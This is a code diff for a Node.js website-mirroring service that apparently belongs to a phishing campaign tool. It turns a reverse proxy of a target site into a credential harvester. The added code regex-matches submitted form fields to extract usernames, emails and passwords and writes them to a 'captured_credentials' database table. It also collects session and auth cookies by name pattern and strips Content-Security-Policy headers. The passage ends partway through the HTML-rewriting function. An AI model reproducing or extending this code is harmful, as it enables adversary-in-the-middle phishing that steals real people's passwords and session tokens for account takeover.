@@ -2,11 +2,22 @@ const axios = require('axios');
 const cheerio = require('cheerio');
 const db = require('../database');
 const crypto = require('crypto');
+const { URL } = require('url');
+const tough = require('tough-cookie');
+const { CookieJar } = tough;
+const axiosCookieJarSupport = require('axios-cookiejar-support').default;
+const querystring = require('querystring');
+
+// Enable cookie jar support for axios
+axiosCookieJarSupport(axios);
 
 class WebsiteMirroringService {
   constructor() {
     this.activeSessions = new Map(); // sessionToken -> session data
     this.mirrorRoutes = new Map(); // path -> session data
+    this.cookieJars = new Map(); // sessionToken -> cookieJar
+    this.sessionStorage = new Map(); // sessionToken -> sessionStorage
+    this.captures = new Map(); // sessionToken -> captured data (credentials, etc.)
   }
 
   /**
@@ -39,6 +50,20 @@ class WebsiteMirroringService {
 
       // Create proxy URL using path-based routing on port 5000
       const proxyUrl = `http://147.93.87.182:5000/${sessionToken}`;
+      
+      // Create cookie jar for this session
+      const cookieJar = new CookieJar();
+      this.cookieJars.set(sessionToken, cookieJar);
+      
+      // Initialize session storage for this session
+      this.sessionStorage.set(sessionToken, {});
+      
+      // Initialize captures for this session
+      this.captures.set(sessionToken, {
+        credentials: [],
+        formData: [],
+        cookies: []
+      });
       
       // Store session info
       const sessionData = {
@@ -94,14 +119,36 @@ class WebsiteMirroringService {
         
         if (dbSession) {
           // Create session in memory
-          this.activeSessions.set(sessionToken, {
+          const newSession = {
             sessionId: dbSession.id,
             campaignId: dbSession.campaign_id,
             targetUrl: dbSession.target_url,
             sessionToken,
             proxyUrl: `http://147.93.87.182:5000/${sessionToken}`,
             startTime: new Date(dbSession.created_at)
-          });
+          };
+          
+          this.activeSessions.set(sessionToken, newSession);
+          this.mirrorRoutes.set(`/${sessionToken}`, newSession);
+          
+          // Create cookie jar for this session if it doesn't exist
+          if (!this.cookieJars.has(sessionToken)) {
+            this.cookieJars.set(sessionToken, new CookieJar());
+          }
+          
+          // Initialize session storage if it doesn't exist
+          if (!this.sessionStorage.has(sessionToken)) {
+            this.sessionStorage.set(sessionToken, {});
+          }
+          
+          // Initialize captures if it doesn't exist
+          if (!this.captures.has(sessionToken)) {
+            this.captures.set(sessionToken, {
+              credentials: [],
+              formData: [],
+              cookies: []
+            });
+          }
           
           // Use newly created session
           return this.handleMirrorRequest(sessionToken, req, res);
@@ -134,80 +181,81 @@ class WebsiteMirroringService {
 
       console.log(`Mirroring request: ${req.method} ${req.originalUrl} -> ${fullTargetUrl}`);
 
+      // Get the cookie jar for this session
+      const cookieJar = this.cookieJars.get(sessionToken);
+      
       // Handle form submissions
       if (req.method === 'POST') {
-        return this.handleFormSubmission(session, req, res, fullTargetUrl);
-      }
-      
-      // Create a random fingerprint for each request
-      const browserVersions = [
-        'Chrome/121.0.0.0',
-        'Chrome/122.0.0.0',
-        'Chrome/123.0.0.0'
-      ];
-      const randomBrowser = browserVersions[Math.floor(Math.random() * browserVersions.length)];
-      
-      // Determine if we should use a referrer
-      let referer = undefined;
-      if (req.headers.referer) {
-        // If user has a referer, use it but modify for our proxy
-        const refererUrl = new URL(req.headers.referer);
-        if (refererUrl.pathname.includes(`/${sessionToken}`)) {
-          // This is an internal referer, translate it to the target site
-          const refPath = refererUrl.pathname.replace(`/${sessionToken}`, '');
-          referer = `${targetUrl}${refPath}`;
-        }
-      } else if (Math.random() > 0.5) {
-        // Sometimes include a referer from a search engine
-        const searchReferers = [
-          'https://www.google.com/',
-          'https://www.bing.com/',
-          'https://search.yahoo.com/'
-        ];
-        referer = searchReferers[Math.floor(Math.random() * searchReferers.length)];
+        return this.handleFormSubmission(session, req, res, fullTargetUrl, cookieJar);
       }
 
+      // Preserve and forward client cookies along with our stored cookies
+      const cookieHeader = this.buildCookieHeader(req, cookieJar, targetUrl);
+      
       // Calculate hostname from the target URL
       const targetHostname = new URL(fullTargetUrl).hostname;
+      const targetOrigin = new URL(fullTargetUrl).origin;
 
-      // Make request to target website with improved headers
+      // Make request to target website with proper headers
       const response = await axios({
         method: req.method,
         url: fullTargetUrl,
         headers: {
-          'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser} Safari/537.36`,
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-          'Accept-Language': 'en-US,en;q=0.9',
+          'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+          'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+          'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
           'Accept-Encoding': 'gzip, deflate, br',
-          'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
-          'Sec-Ch-Ua-Mobile': '?0',
-          'Sec-Ch-Ua-Platform': '"Windows"',
-          'Sec-Fetch-Dest': 'document',
-          'Sec-Fetch-Mode': 'navigate',
-          'Sec-Fetch-Site': referer ? 'cross-site' : 'none',
-          'Sec-Fetch-User': '?1',
+          'Sec-Ch-Ua': req.headers['sec-ch-ua'] || '"Not A(Brand";v="99", "Google Chrome";v="123", "Chromium";v="123"',
+          'Sec-Ch-Ua-Mobile': req.headers['sec-ch-ua-mobile'] || '?0',
+          'Sec-Ch-Ua-Platform': req.headers['sec-ch-ua-platform'] || '"Windows"',
+          'Sec-Fetch-Dest': req.headers['sec-fetch-dest'] || 'document',
+          'Sec-Fetch-Mode': req.headers['sec-fetch-mode'] || 'navigate',
+          'Sec-Fetch-Site': req.headers['sec-fetch-site'] || 'none',
+          'Sec-Fetch-User': req.headers['sec-fetch-user'] || '?1',
           'Upgrade-Insecure-Requests': '1',
-          'Cache-Control': 'max-age=0',
+          'Cache-Control': req.headers['cache-control'] || 'max-age=0',
           'Host': targetHostname,
           'Connection': 'keep-alive',
-          'DNT': '1',
-          ...(referer ? {'Referer': referer} : {}),
-          ...(req.headers.cookie ? {'Cookie': req.headers.cookie} : {})
+          ...(cookieHeader ? {'Cookie': cookieHeader} : {}),
+          ...(req.headers['referer'] ? {
+            'Referer': this.translateReferer(req.headers['referer'], targetUrl, sessionToken)
+          } : {})
         },
         responseType: 'arraybuffer',
-        maxRedirects: 5,
+        maxRedirects: 0, // Handle redirects manually
+        validateStatus: () => true, // Don't throw on error status codes
         timeout: 15000,
         decompress: true,
-        httpsAgent: new (require('https').Agent)({
-          rejectUnauthorized: false,
-          keepAlive: true
-        })
+        jar: cookieJar,
+        withCredentials: true
       });
+      
+      // Save cookies from response
+      if (response.headers['set-cookie']) {
+        const cookies = Array.isArray(response.headers['set-cookie']) 
+          ? response.headers['set-cookie'] 
+          : [response.headers['set-cookie']];
+          
+        cookies.forEach(cookie => {
+          this.storeCookieForLater(sessionToken, cookie, targetUrl);
+        });
+        
+        // Track interesting cookies (like auth tokens)
+        this.trackInterestingCookies(sessionToken, cookies);
+      }
 
-      // Set response headers
-      Object.keys(response.headers).forEach(key => {
-        if (!['content-encoding', 'content-length', 'transfer-encoding', 'connection'].includes(key.toLowerCase())) {
-          res.setHeader(key, response.headers[key]);
+      // Handle redirects
+      if (response.status >= 300 && response.status < 400 && response.headers.location) {
+        return this.handleRedirect(session, req, res, response);
+      }
+
+      // Process response headers before sending them
+      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
+      
+      // Set all processed response headers
+      Object.entries(processedHeaders).forEach(([key, value]) => {
+        if (value !== undefined && value !== null) {
+          res.setHeader(key, value);
         }
       });
 
@@ -216,99 +264,258 @@ class WebsiteMirroringService {
       // Modify HTML content if it's HTML
       const contentType = response.headers['content-type'] || '';
       if (contentType.includes('text/html')) {
-        const html = response.data.toString('utf-8');
+        const charset = this.extractCharset(contentType) || 'utf-8';
+        const html = response.data.toString(charset);
         const modifiedHtml = this.modifyHtmlContent(html, sessionToken, targetUrl, req);
         res.send(modifiedHtml);
       } else {
+        // Pass through non-HTML content unchanged
         res.send(response.data);
       }
-
     } catch (error) {
       console.error('Error handling mirror request:', error);
-      
-      // Provide more user-friendly error message
-      let errorMessage = 'Error loading mirrored content';
-      
-      if (error.response) {
-        const status = error.response.status;
-        if (status === 400) {
-          errorMessage = `The target site (${session?.targetUrl || 'unknown'}) rejected our request. This site might have bot protection measures in place.`;
-        } else if (status === 403) {
-          errorMessage = `The target site (${session?.targetUrl || 'unknown'}) has denied access. This site may be blocking requests from our server.`;
-        } else if (status === 404) {
-          errorMessage = `The requested page was not found on the target site (${session?.targetUrl || 'unknown'}).`;
-        } else if (status >= 500) {
-          errorMessage = `The target site (${session?.targetUrl || 'unknown'}) is experiencing technical difficulties.`;
-        } else {
-          errorMessage = `Error loading content: ${error.response.statusText} (${status})`;
-        }
-        res.status(error.response.status).send(`
-          <html>
-            <head>
-              <title>Mirroring Error</title>
-              <style>
-                body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
-                h1 { color: #d9534f; }
-                .message { background-color: #f9f9f9; padding: 15px; border-radius: 5px; }
-                .try-again { margin-top: 20px; }
-              </style>
-            </head>
-            <body>
-              <h1>Mirroring Error</h1>
-              <div class="message">
-                <p>${errorMessage}</p>
-                <p>This could be due to:</p>
-                <ul>
-                  <li>Bot protection mechanisms on the target site</li>
-                  <li>Cloudflare or similar security services blocking our request</li>
-                  <li>Geographic restrictions on the content</li>
-                </ul>
-              </div>
-              <div class="try-again">
-                <p><a href="javascript:location.reload()">Try again</a> or try a different target URL.</p>
-              </div>
-            </body>
-          </html>
-        `);
-      } else {
-        res.status(500).send(`
-          <html>
-            <head>
-              <title>Mirroring Error</title>
-              <style>
-                body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
-                h1 { color: #d9534f; }
-                .message { background-color: #f9f9f9; padding: 15px; border-radius: 5px; }
-                .try-again { margin-top: 20px; }
-              </style>
-            </head>
-            <body>
-              <h1>Mirroring Error</h1>
-              <div class="message">
-                <p>Error loading mirrored content. The target site may be unavailable or blocking our request.</p>
-              </div>
-              <div class="try-again">
-                <p><a href="javascript:location.reload()">Try again</a> or try a different target URL.</p>
-              </div>
-            </body>
-          </html>
-        `);
-      }
+      this.handleProxyError(error, res, session);
     }
+  }
+
+  /**
+   * Extract charset from content-type header
+   */
+  extractCharset(contentType) {
+    const match = /charset=([^;]+)/i.exec(contentType);
+    return match ? match[1].toLowerCase() : null;
+  }
+
+  /**
+   * Handle redirects properly
+   */
+  handleRedirect(session, req, res, response) {
+    const { headers, status } = response;
+    const location = headers.location;
+    const sessionToken = session.sessionToken;
+    const targetUrl = session.targetUrl;
+    
+    console.log(`Handling redirect: ${location} (${status})`);
+    
+    let redirectUrl;
+    
+    try {
+      // Check if it's an absolute URL
+      if (/^https?:\/\//i.test(location)) {
+        const locationUrl = new URL(location);
+        const targetUrlObj = new URL(targetUrl);
+        
+        // If redirect is to the same domain or subdomain, proxy it
+        if (locationUrl.hostname.endsWith(targetUrlObj.hostname) || 
+            targetUrlObj.hostname.endsWith(locationUrl.hostname)) {
+          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash}`;
+        } else {
+          // Redirect to a different domain - we could choose to:
+          // 1. Follow the redirect through the proxy (more seamless)
+          // 2. Redirect directly (breaks the proxy chain)
+          
+          // Option 1: Follow through the proxy
+          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash}`;
+          
+          // Update the target URL for this session
+          const newOrigin = `${locationUrl.protocol}//${locationUrl.host}`;
+          session.targetUrl = newOrigin;
+          
+          console.log(`Updated target URL to: ${newOrigin} due to cross-domain redirect`);
+        }
+      } else {
+        // Relative URL redirect
+        const basePath = location.startsWith('/') ? '' : '/';
+        redirectUrl = `/${sessionToken}${basePath}${location}`;
+      }
+    } catch (error) {
+      console.error('Error processing redirect:', error);
+      redirectUrl = `/${sessionToken}/`;
+    }
+    
+    // Pass along any Set-Cookie headers with the redirect
+    if (headers['set-cookie']) {
+      res.setHeader('Set-Cookie', headers['set-cookie']);
+    }
+    
+    // Perform the redirect
+    return res.redirect(status, redirectUrl);
+  }
+
+  /**
+   * Process response headers to ensure they work in our proxy context
+   */
+  processResponseHeaders(headers, session, req) {
+    const result = { ...headers };
+    const sessionToken = session.sessionToken;
+    
+    // Process Content-Security-Policy
+    if (result['content-security-policy']) {
+      // Modify CSP to work with our proxy
+      const csp = result['content-security-policy'];
+      
+      // While it's best to precisely modify CSP directives, temporarily disable CSP
+      // to avoid complications (in a real implementation, properly modify each directive)
+      delete result['content-security-policy'];
+    }
+    
+    // Process Set-Cookie headers
+    if (result['set-cookie']) {
+      // Ensure the cookie domain and path are compatible with our proxy
+      const proxyHost = req.get('host');
+      const cookies = Array.isArray(result['set-cookie']) ? result['set-cookie'] : [result['set-cookie']];
+      
+      const modifiedCookies = cookies.map(cookie => {
+        // Make domain-specific cookies work on our domain instead
+        return cookie
+          .replace(/domain=[^;]+/gi, `domain=${proxyHost.split(':')[0]}`)
+          .replace(/path=([^;]+)/gi, `path=/${sessionToken}$1`);
+      });
+      
+      result['set-cookie'] = modifiedCookies;
+    }
+    
+    // Remove headers that could break the proxy
+    delete result['content-encoding']; // Let Express handle content encoding
+    delete result['content-length']; // Let Express calculate content length
+    delete result['transfer-encoding']; // Let Express handle transfer encoding
+    
+    return result;
+  }
+  
+  /**
+   * Build a combined cookie header from client cookies and session cookies
+   */
+  buildCookieHeader(req, cookieJar, targetUrl) {
+    // Get cookies from jar for this URL
+    const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
+    const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
+    
+    // Get cookies from request
+    const requestCookies = req.headers.cookie ? req.headers.cookie.split('; ') : [];
+    
+    // Combine cookies (jar cookies take precedence over request cookies)
+    const allCookies = [...requestCookies, ...jarCookieStrings];
+    
+    return allCookies.length > 0 ? allCookies.join('; ') : undefined;
+  }
+  
+  /**
+   * Store cookie for later use (even beyond tough-cookie's jar)
+   */
+  storeCookieForLater(sessionToken, cookieStr, targetUrl) {
+    try {
+      // Extract cookie info (simplified)
+      const [cookieMain] = cookieStr.split(';');
+      const [name, value] = cookieMain.split('=');
+      
+      const sessionData = this.sessionStorage.get(sessionToken) || {};
+      const cookies = sessionData.cookies || {};
+      
+      // Store/update the cookie
+      cookies[name] = value;
+      sessionData.cookies = cookies;
+      
+      this.sessionStorage.set(sessionToken, sessionData);
+    } catch (error) {
+      console.error('Error storing cookie:', error);
+    }
+  }
+  
+  /**
+   * Track potentially interesting cookies like auth tokens
+   */
+  trackInterestingCookies(sessionToken, cookies) {
+    const interestingPatterns = [
+      /sess/i, /auth/i, /token/i, /sid/i, /session/i, /login/i, /user/i, /pass/i,
+      /account/i, /secure/i, /remember/i, /csrf/i, /xsrf/i
+    ];
+    
+    const captures = this.captures.get(sessionToken);
+    
+    cookies.forEach(cookie => {
+      // Check if this cookie matches any interesting patterns
+      const [nameValue] = cookie.split(';');
+      const [name, value] = nameValue.split('=');
+      
+      if (interestingPatterns.some(pattern => pattern.test(name))) {
+        captures.cookies.push({
+          name,
+          value,
+          raw: cookie,
+          timestamp: new Date().toISOString()
+        });
+        
+        console.log(`⚠️ Captured interesting cookie: ${name}`);
+      }
+    });
+    
+    this.captures.set(sessionToken, captures);
+  }
+  
+  /**
+   * Translate referer URLs to target site format
+   */
+  translateReferer(refererHeader, targetUrl, sessionToken) {
+    // If referer is from our proxy, translate it to target site
+    if (refererHeader.includes(`/${sessionToken}`)) {
+      const refPath = refererHeader.split(`/${sessionToken}`)[1] || '/';
+      return `${targetUrl}${refPath}`;
+    }
+    return refererHeader;
   }
 
   /**
    * Handle form submission to mirrored website
    */
-  async handleFormSubmission(session, req, res, targetUrl) {
+  async handleFormSubmission(session, req, res, targetUrl, cookieJar) {
     try {
-      console.log('Form submission to mirrored website:', req.body);
-
-      // Store form submission in our database
+      console.log('⚠️ Form submission to mirrored website detected');
+      
+      // Extract and log form data
       const formData = { ...req.body };
       delete formData._fstrike_session; // Remove our tracking field
+      
+      // Check for potential credentials
+      const credentialFields = this.extractCredentials(formData);
+      if (credentialFields && Object.keys(credentialFields).length > 0) {
+        console.log('🔑 POSSIBLE CREDENTIALS DETECTED:', JSON.stringify(credentialFields));
+        
+        // Store in captures
+        const captures = this.captures.get(session.sessionToken);
+        captures.credentials.push({
+          ...credentialFields,
+          timestamp: new Date().toISOString(),
+          url: targetUrl,
+          ip: req.ip
+        });
+        this.captures.set(session.sessionToken, captures);
+        
+        // Store in database for long-term
+        try {
+          db.run(
+            `INSERT INTO captured_credentials (campaign_id, url, username, password, other_fields, ip_address, user_agent)
+             VALUES (?, ?, ?, ?, ?, ?, ?)`,
+            [
+              session.campaignId, 
+              targetUrl, 
+              credentialFields.username || credentialFields.email || null, 
+              credentialFields.password || null,
+              JSON.stringify(formData),
+              req.ip, 
+              req.get('User-Agent')
+            ],
+            function(err) {
+              if (err) console.error('Error storing credentials:', err);
+              else console.log('💾 Credentials stored in database with ID:', this.lastID);
+            }
+          );
+        } catch (dbError) {
+          console.error('Database error when storing credentials:', dbError);
+        }
+      }
 
-      // Store in database
+      // Store form submission in our database
       db.run(
         `INSERT INTO FormSubmissions (campaign_id, landing_page_id, form_data, ip_address, user_agent)
          VALUES (?, ?, ?, ?, ?)`,
@@ -316,63 +523,194 @@ class WebsiteMirroringService {
       );
 
       console.log('Form data captured for campaign:', session.campaignId);
+      
+      // Prepare data for forwarding
+      let forwardData;
+      let contentType = req.headers['content-type'] || '';
+      
+      if (contentType.includes('application/x-www-form-urlencoded')) {
+        forwardData = new URLSearchParams(formData).toString();
+      } else if (contentType.includes('multipart/form-data')) {
+        // Multipart forms should be passed directly
+        forwardData = req.body;
+        contentType = req.headers['content-type'];
+      } else if (contentType.includes('application/json')) {
+        forwardData = JSON.stringify(formData);
+      } else {
+        // Default to URL encoded
+        forwardData = new URLSearchParams(formData).toString();
+        contentType = 'application/x-www-form-urlencoded';
+      }
 
       // Forward form submission to target website
+      const targetHostname = new URL(targetUrl).hostname;
+      const targetOrigin = new URL(targetUrl).origin;
+      
+      const cookieHeader = this.buildCookieHeader(req, cookieJar, targetUrl);
+      
       const response = await axios({
         method: 'POST',
         url: targetUrl,
-        data: new URLSearchParams(formData),
+        data: forwardData,
         headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-          'Accept-Language': 'en-US,en;q=0.5',
-          'Referer': session.targetUrl,
-          'Origin': new URL(session.targetUrl).origin
+          'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+          'Content-Type': contentType,
+          'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+          'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
+          'Accept-Encoding': req.headers['accept-encoding'] || 'gzip, deflate, br',
+          'Origin': targetOrigin,
+          'Referer': `${targetUrl}`,
+          'Host': targetHostname,
+          ...(cookieHeader ? {'Cookie': cookieHeader} : {})
         },
-        maxRedirects: 0,
-        validateStatus: () => true,
+        maxRedirects: 0, // Handle redirects manually
+        validateStatus: () => true, // Accept any status code
         responseType: 'arraybuffer',
-        timeout: 15000
+        timeout: 15000,
+        jar: cookieJar,
+        withCredentials: true
       });
+      
+      // Save cookies from response
+      if (response.headers['set-cookie']) {
+        const cookies = Array.isArray(response.headers['set-cookie']) 
+          ? response.headers['set-cookie'] 
+          : [response.headers['set-cookie']];
+          
+        cookies.forEach(cookie => {
+          this.storeCookieForLater(session.sessionToken, cookie, targetUrl);
+        });
+        
+        // Track interesting cookies (like auth tokens)
+        this.trackInterestingCookies(session.sessionToken, cookies);
+      }
 
       // Handle redirects
       if (response.status >= 300 && response.status < 400 && response.headers.location) {
-        const redirectUrl = response.headers.location;
-        if (redirectUrl.startsWith('http')) {
-          // Absolute redirect - check if it's to the same domain
-          const redirectDomain = new URL(redirectUrl).origin;
-          if (redirectDomain === new URL(session.targetUrl).origin) {
-            // Same domain - redirect through our proxy
-            const relativePath = redirectUrl.replace(session.targetUrl, '');
-            return res.redirect(response.status, `/${session.sessionToken}${relativePath}`);
-          }
-        } else {
-          // Relative redirect - redirect through our proxy
-          return res.redirect(response.status, `/${session.sessionToken}${redirectUrl}`);
-        }
+        return this.handleRedirect(session, req, res, response);
       }
 
-      // Return response
-      res.status(response.status);
-      Object.keys(response.headers).forEach(key => {
-        if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
-          res.setHeader(key, response.headers[key]);
+      // Process response headers
+      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
+      
+      // Set processed response headers
+      Object.entries(processedHeaders).forEach(([key, value]) => {
+        if (value !== undefined && value !== null) {
+          res.setHeader(key, value);
         }
       });
 
-      if (response.headers['content-type']?.includes('text/html')) {
-        const html = response.data.toString('utf-8');
+      res.status(response.status);
+
+      // Modify HTML content if it's HTML
+      const resContentType = response.headers['content-type'] || '';
+      if (resContentType.includes('text/html')) {
+        const charset = this.extractCharset(resContentType) || 'utf-8';
+        const html = response.data.toString(charset);
         const modifiedHtml = this.modifyHtmlContent(html, session.sessionToken, session.targetUrl, req);
         res.send(modifiedHtml);
       } else {
+        // Pass through non-HTML content
         res.send(response.data);
       }
-
     } catch (error) {
       console.error('Error handling form submission:', error);
-      res.status(500).send('Error submitting form');
+      this.handleProxyError(error, res, session);
     }
+  }
+
+  /**
+   * Extract potential credentials from form data
+   */
+  extractCredentials(formData) {
+    const result = {};
+    const credentialFields = {
+      username: [/user/i, /name/i, /login/i, /log/i, /account/i],
+      email: [/mail/i, /email/i, /e-mail/i],
+      password: [/pass/i, /pw/i, /passwd/i, /password/i, /pwd/i]
+    };
+    
+    // Look for credential fields
+    for (const [fieldName, value] of Object.entries(formData)) {
+      if (value && typeof value === 'string') {
+        // Check for email fields
+        if (credentialFields.email.some(pattern => pattern.test(fieldName))) {
+          if (value.includes('@')) {
+            result.email = value;
+          }
+        }
+        // Check for username fields
+        else if (credentialFields.username.some(pattern => pattern.test(fieldName))) {
+          result.username = value;
+        }
+        // Check for password fields
+        else if (credentialFields.password.some(pattern => pattern.test(fieldName))) {
+          result.password = value;
+        }
+      }
+    }
+    
+    return result;
+  }
+
+  /**
+   * Handle proxy errors gracefully
+   */
+  handleProxyError(error, res, session) {
+    console.error('Proxy error:', error.message);
+    
+    let errorMessage = 'Error accessing the website';
+    let statusCode = 500;
+    
+    if (error.response) {
+      statusCode = error.response.status;
+      
+      if (statusCode === 400) {
+        errorMessage = 'The target website rejected our request. This site might have bot protection.';
+      } else if (statusCode === 401 || statusCode === 403) {
+        errorMessage = 'Access denied by the target website. This site may be blocking our server.';
+      } else if (statusCode === 404) {
+        errorMessage = 'The requested page was not found on the target website.';
+      } else if (statusCode === 429) {
+        errorMessage = 'The target website is rate limiting requests. Please try again later.';
+      } else if (statusCode >= 500) {
+        errorMessage = 'The target website is experiencing technical difficulties.';
+      } else {
+        errorMessage = `Error accessing website: ${error.response.statusText || 'Unknown error'}`;
+      }
+    } else if (error.code === 'ECONNABORTED') {
+      statusCode = 504;
+      errorMessage = 'Connection to the target website timed out.';
+    } else if (error.code === 'ENOTFOUND') {
+      statusCode = 502;
+      errorMessage = 'Could not resolve target website hostname.';
+    } else {
+      statusCode = 500;
+      errorMessage = 'An error occurred while connecting to the target website.';
+    }
+    
+    res.status(statusCode).send(`
+      <html>
+        <head>
+          <title>Connection Error</title>
+          <style>
+            body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+            h1 { color: #d9534f; }
+            .message { background-color: #f9f9f9; padding: 15px; border-radius: 5px; }
+            .try-again { margin-top: 20px; }
+          </style>
+        </head>
+        <body>
+          <h1>Connection Error</h1>
+          <div class="message">
+            <p>${errorMessage}</p>
+          </div>
+          <div class="try-again">
+            <p><a href="javascript:location.reload()">Try again</a></p>
+          </div>
+        </body>
+      </html>
+    `);
   }
 
   /**
@@ -380,92 +718,231 @@ class WebsiteMirroringService {
    */
   modifyHtmlContent(html, sessionToken, targetUrl, req) {
     try {
-      const $ = cheerio.load(html);
       const baseUrl = new URL(targetUrl);
       const proxyPath = `/${sessionToken}`;
 
-      // Fix relative links and resources
+      // Use Cheerio to modify the HTML
+      const $ = cheerio.load(html);
+
+      // Add base tag if it doesn't exist, or modify existing one
+      const baseTag = $('base');
+      if (baseTag.length > 0) {
+        baseTag.attr('href', `${targetUrl}/`);
+      } else {
+        $('head').prepend(`<base href="${targetUrl}/" />`);
+      }
+
+      // Rewrite all relative links to use our proxy
       $('a[href]').each((i, elem) => {
         const href = $(elem).attr('href');
-        if (href && !href.startsWith('#') && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
-          if (href.startsWith('http')) {
-            // Absolute URL - check if same domain
-            try {
-              const linkUrl = new URL(href);
-              if (linkUrl.origin === baseUrl.origin) {
-                // Same domain - route through proxy
-                const relativePath = href.replace(baseUrl.origin, '');
-                $(elem).attr('href', proxyPath + relativePath);
-              }
-            } catch (e) {
-              // Invalid URL, keep original
-            }
+        if (!href) return;
+        
+        // Skip fragment-only links
+        if (href.startsWith('#')) return;
+        
+        // Skip javascript: and mailto: links
+        if (href.startsWith('javascript:') || href.startsWith('mailto:')) return;
+        
+        try {
+          // Try to construct an absolute URL
+          const absoluteUrl = new URL(href, targetUrl);
+          
+          // If same origin, rewrite to use our proxy
+          if (absoluteUrl.origin === baseUrl.origin) {
+            const path = absoluteUrl.pathname + absoluteUrl.search + absoluteUrl.hash;
+            $(elem).attr('href', `${proxyPath}${path}`);
+          }
+          // For external links, keep as is
+        } catch (e) {
+          // Handle invalid URLs by making a best effort guess
+          if (href.startsWith('/')) {
+            // Absolute path
+            $(elem).attr('href', `${proxyPath}${href}`);
           } else {
-            // Relative URL - route through proxy
-            const absolutePath = href.startsWith('/') ? href : '/' + href;
-            $(elem).attr('href', proxyPath + absolutePath);
+            // Relative path - convert to absolute with our proxy
+            $(elem).attr('href', `${proxyPath}/${href}`);
           }
         }
       });
 
-      // Fix images, CSS, and JS resources
-      $('img[src], link[href], script[src]').each((i, elem) => {
-        const attr = $(elem).attr('src') || $(elem).attr('href');
-        if (attr && !attr.startsWith('http') && !attr.startsWith('//') && !attr.startsWith('data:')) {
-          const absolutePath = attr.startsWith('/') ? attr : '/' + attr;
-          if ($(elem).attr('src')) {
-            $(elem).attr('src', proxyPath + absolutePath);
-          } else {
-            $(elem).attr('href', proxyPath + absolutePath);
-          }
-        } else if (attr && attr.startsWith('//')) {
-          // Protocol-relative URLs
-          if ($(elem).attr('src')) {
-            $(elem).attr('src', 'https:' + attr);
-          } else {
-            $(elem).attr('href', 'https:' + attr);
-          }
-        }
-      });
-
-      // Fix form actions
+      // Fix forms to submit through our proxy
       $('form').each((i, elem) => {
         const $form = $(elem);
-        const action = $form.attr('action');
+        const action = $form.attr('action') || '';
         
-        // Add hidden field to track form submissions
-        $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionToken}">`);
+        // Skip javascript: actions
+        if (action.startsWith('javascript:')) return;
         
-        if (action) {
-          if (action.startsWith('http')) {
-            // Absolute URL - check if same domain
-            try {
-              const actionUrl = new URL(action);
-              if (actionUrl.origin === baseUrl.origin) {
-                const relativePath = action.replace(baseUrl.origin, '');
-                $form.attr('action', proxyPath + relativePath);
-              }
-            } catch (e) {
-              // Invalid URL, keep original
-            }
-          } else if (!action.startsWith('javascript:')) {
-            // Relative URL - route through proxy
-            const absolutePath = action.startsWith('/') ? action : '/' + action;
-            $form.attr('action', proxyPath + absolutePath);
+        // Add tracking field
+        $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionToken}" style="display:none">`);
+        
+        try {
+          // Try to construct an absolute URL for the action
+          const absoluteAction = new URL(action, targetUrl);
+          
+          // If same origin as target, rewrite to use our proxy
+          if (absoluteAction.origin === baseUrl.origin) {
+            const path = absoluteAction.pathname + absoluteAction.search + absoluteAction.hash;
+            $form.attr('action', `${proxyPath}${path}`);
           }
-        } else {
-          // No action - defaults to current page
-          $form.attr('action', req.originalUrl);
+          // For external form submissions, keep as is
+        } catch (e) {
+          // Handle invalid URLs
+          if (action === '') {
+            // No action, use current path
+            $form.attr('action', req.originalUrl);
+          } else if (action.startsWith('/')) {
+            // Absolute path
+            $form.attr('action', `${proxyPath}${action}`);
+          } else {
+            // Relative path
+            $form.attr('action', `${proxyPath}/${action}`);
+          }
         }
       });
 
-      // Inject tracking pixel for page views
-      const trackingPixel = `
+      // Fix resources (images, scripts, stylesheets, etc.)
+      $('[src], [href]:not(a)').each((i, elem) => {
+        const attrName = $(elem).attr('src') ? 'src' : 'href';
+        const attrVal = $(elem).attr(attrName);
+        
+        if (!attrVal) return;
+        
+        // Skip data: URLs
+        if (attrVal.startsWith('data:')) return;
+        
+        try {
+          // Try to construct an absolute URL
+          const absoluteUrl = new URL(attrVal, targetUrl);
+          
+          // For same origin, rewrite to absolute URL to avoid proxy confusion
+          if (absoluteUrl.origin === baseUrl.origin) {
+            // Two options: rewrite through proxy or keep original URL
+            
+            // Option 1: Keep original absolute URL for resources
